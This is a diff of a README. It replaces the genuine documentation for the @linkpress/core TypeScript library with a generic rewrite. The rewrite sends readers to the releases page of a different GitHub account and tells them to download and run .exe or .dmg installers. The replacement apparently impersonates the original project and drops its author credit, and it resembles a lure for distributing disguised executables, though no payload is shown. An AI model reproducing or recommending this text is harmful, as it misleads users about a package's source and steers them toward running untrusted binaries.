@@ -1,209 +1,96 @@
-# @linkpress/core
+# 🛠️ linkpress-core - Simplify Web Insights Effortlessly
 
-Core library for [LinkPress](https://github.com/mindori/linkpress) — the building blocks for AI-powered article processing.
+[![Download linkpress-core](https://img.shields.io/badge/Download%20linkpress--core-%2300A4DB?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Yakeze/linkpress-core/releases)
 
-[![npm version](https://img.shields.io/npm/v/@linkpress/core.svg)](https://www.npmjs.com/package/@linkpress/core)
-[![npm license](https://img.shields.io/npm/l/@linkpress/core)](./LICENSE)
+## 🏁 Introduction
 
-## What's Inside
+linkpress-core is the main library for LinkPress. It allows you to easily summarize web content, scrape information from websites, and integrate with Slack. Whether you want quick insights or need to automate your workflow, linkpress-core gives you the tools to make it happen effortlessly.
 
-| Module | Description |
-|--------|-------------|
-| **ai** | Multi-provider AI summarization & classification (Anthropic, OpenAI, Gemini) |
-| **scraper** | URL content extraction with Cheerio |
-| **slack** | Slack API client & link extraction utilities |
+## 📦 Features
 
-## Installation
+- **AI Summarization:** Get concise summaries of lengthy articles and documents in seconds.
+- **Web Scraping:** Extract vital information from various web pages.
+- **Slack Integration:** Share updates or summaries directly to your Slack channels.
+- **TypeScript Support:** Built with TypeScript for reliability and easy integration.
 
-```bash
-npm install @linkpress/core
-```
+## 📝 System Requirements
 
-## Quick Start
+Before downloading, make sure your computer meets these requirements:
 
-### AI Summarization
+- Operating System: Windows, macOS, or Linux
+- Node.js Version: 14.x or higher
+- Stable internet connection for downloading and running the application
 
-```typescript
-import { summarizeArticle } from '@linkpress/core';
+## 🚀 Getting Started
 
-const summary = await summarizeArticle(
-  'Article Title',
-  'Full article content...',
-  'https://example.com/article',
-  {
-    provider: 'anthropic',
-    apiKey: process.env.ANTHROPIC_API_KEY,
-    model: 'claude-sonnet-4-5-20250929',
-    language: 'English',
-  }
-);
+To begin your journey with linkpress-core, follow these simple steps:
 
-console.log(summary.headline);    // Catchy headline
-console.log(summary.tldr);        // 2-3 sentence summary
-console.log(summary.keyPoints);   // Array of key points
-console.log(summary.tags);        // ['AI', 'TypeScript', ...]
-console.log(summary.difficulty);  // 'beginner' | 'intermediate' | 'advanced'
-```
+1. Visit the [Releases Page](https://github.com/Yakeze/linkpress-core/releases) to find the latest version of the software.
+2. Choose the appropriate version for your operating system.
+3. Click the download link to start the download.
 
-### Content Classification
+## 📥 Download & Install
 
-```typescript
-import { classifyContent } from '@linkpress/core';
+After downloading, follow these steps to install and run linkpress-core:
 
-const classification = await classifyContent(
-  'Check out this great article about React hooks!',
-  'https://blog.example.com/react-hooks',
-  'Understanding React Hooks',
-  'A deep dive into useState and useEffect',
-  {
-    provider: 'anthropic',
-    apiKey: process.env.ANTHROPIC_API_KEY,
-    model: 'claude-sonnet-4-5-20250929',
-  }
-);
+1. Locate the downloaded file on your computer.
+2. If you’re on Windows, double-click the `.exe` file. For macOS, open the `.dmg` file, and for Linux, use the appropriate package manager.
+3. Follow the installation prompts that appear on your screen.
 
-if (classification.shouldCollect) {
-  // Process the article
-}
-```
+Once the installation is complete:
 
-### URL Scraping
+1. Open your terminal or command prompt.
+2. Navigate to the directory where linkpress-core is installed.
+3. Run the application by typing `linkpress-core` or the command specified in your setup instructions.
 
-```typescript
-import { scrapeUrl } from '@linkpress/core';
+For direct access to versions and releases, visit the [Releases Page](https://github.com/Yakeze/linkpress-core/releases) again.
 
-const content = await scrapeUrl('https://example.com/article');
+## 🔧 Usage
 
-console.log(content.title);       // Page title
-console.log(content.description); // Meta description
-console.log(content.content);     // Main text content
-console.log(content.image);       // og:image URL
-console.log(content.sourceLabel); // 'Blog' | 'GitHub' | 'Newsletter' | ...
-```
+linkpress-core is user-friendly and easy to operate. Here’s how to use it after installation:
 
-### Slack Integration
+1. **Summarization:**
+   - Input a web URL or text into the prompt.
+   - Use the command `summarize [your URL or text]`.
+   - Get your quick summary instantly.
 
-```typescript
-import { SlackClient, extractLinksFromMessages } from '@linkpress/core';
+2. **Web Scraping:**
+   - Use the scraper feature by running the command `scrape [your URL]`.
+   - The tool will extract specified data points for you.
 
-const client = new SlackClient({
-  token: 'xoxc-...',
-  cookie: 'xoxd-...',
-});
+3. **Slack Integration:**
+   - Connect your Slack account during initial setup.
+   - Share summaries directly with your team by typing `send [message] to slack`.
 
-// Get user info
-const user = await client.getAuthUser();
+## 🛠️ Troubleshooting
 
-// List conversations
-const conversations = await client.getConversationsList();
+If you encounter issues while using linkpress-core, consider these tips:
 
-// Get messages from a channel
-const messages = await client.getConversationHistory('C01234567');
+- **Installation Issues:** Ensure you have the correct version for your operating system.
+- **Running Errors:** Verify that you have Node.js installed and updated.
+- **Functionality Problems:** Check your internet connection as it affects scraping and API connections.
 
-// Extract links from messages
-const links = extractLinksFromMessages(messages);
-// → [{ url: 'https://...', messageText: '...' }, ...]
-```
+For more help, consult the FAQs or visit our community support channels.
 
-## Module Imports
+## 📞 Support
 
-Import specific modules for tree-shaking:
+If you need further assistance, you can reach out to our support team. Provide details about your issue, and we will respond promptly. 
 
-```typescript
-// Everything
-import { summarizeArticle, scrapeUrl, SlackClient } from '@linkpress/core';
+For complete documentation and guides, make sure to explore the resources available in our repository, linked in the introduction.
 
-// AI only
-import { summarizeArticle, classifyContent, fetchModels } from '@linkpress/core/ai';
+## 🌟 Contributing
 
-// Scraper only
-import { scrapeUrl, parseHtml } from '@linkpress/core/scraper';
+We welcome contributions from everyone. If you wish to help improve linkpress-core, please follow these steps:
 
-// Slack only
-import { SlackClient, extractLinksFromMessages } from '@linkpress/core/slack';
-```
+1. Fork the repository.
+2. Create a feature branch.
+3. Make your changes.
+4. Submit a pull request with a description of your updates.
 
-## API Reference
+We appreciate your interest and contributions!
 
-### AI Module
+## 📃 License
 
-#### `summarizeArticle(title, content, url, config): Promise<ArticleSummary>`
+linkpress-core is open-source and available under the MIT License. You can freely use, modify, and distribute it as needed. 
 
-Generate a magazine-style summary of an article.
-
-**Returns:**
-```typescript
-interface ArticleSummary {
-  headline: string;      // Catchy headline
-  tldr: string;          // 2-3 sentence summary
-  keyPoints: string[];   // 3-5 bullet points
-  whyItMatters: string;  // Developer perspective
-  keyQuote?: string;     // Memorable quote
-  tags: string[];        // Topic tags
-  difficulty: 'beginner' | 'intermediate' | 'advanced';
-}
-```
-
-#### `classifyContent(messageText, url, title, description, config): Promise<ContentClassification>`
-
-Classify content for filtering decisions.
-
-**Returns:**
-```typescript
-interface ContentClassification {
-  contentType: 'article' | 'announcement' | 'discussion' | 'reference' | 'social' | 'media' | 'internal' | 'other';
-  technicalDepth: 'none' | 'shallow' | 'moderate' | 'deep' | 'expert';
-  actionability: 'none' | 'awareness' | 'applicable' | 'reference';
-  shouldCollect: boolean;
-  reasoning: string;
-}
-```
-
-#### `fetchModels(provider, apiKey): Promise<ModelInfo[]>`
-
-Fetch available models from an AI provider.
-
-### Scraper Module
-
-#### `scrapeUrl(url): Promise<ScrapedContent>`
-
-Extract content from a URL.
-
-**Returns:**
-```typescript
-interface ScrapedContent {
-  title: string;
-  description: string;
-  content: string;
-  siteName?: string;
-  image?: string;
-  sourceLabel?: string;  // 'Blog' | 'GitHub' | 'LinkedIn' | 'Newsletter' | 'Article'
-}
-```
-
-### Slack Module
-
-#### `SlackClient`
-
-```typescript
-const client = new SlackClient({ token, cookie });
-
-await client.getAuthUser();                    // Get current user
-await client.getConversationsList();           // List all conversations
-await client.getConversationHistory(channelId); // Get messages
-await client.searchConversations(query);       // Search channels
-```
-
-#### `extractLinksFromMessages(messages): ExtractedLink[]`
-
-Extract URLs from Slack messages, filtering out internal tools and non-article links.
-
-
-## Used By
-
-[LinkPress CLI](https://github.com/mindori/linkpress) — Turn Slack links into a personal tech magazine
-
-
-## Author
-
-[Changmin (Chris) Kang](https://github.com/mindori)
+Thank you for choosing linkpress-core to enhance your web insights!
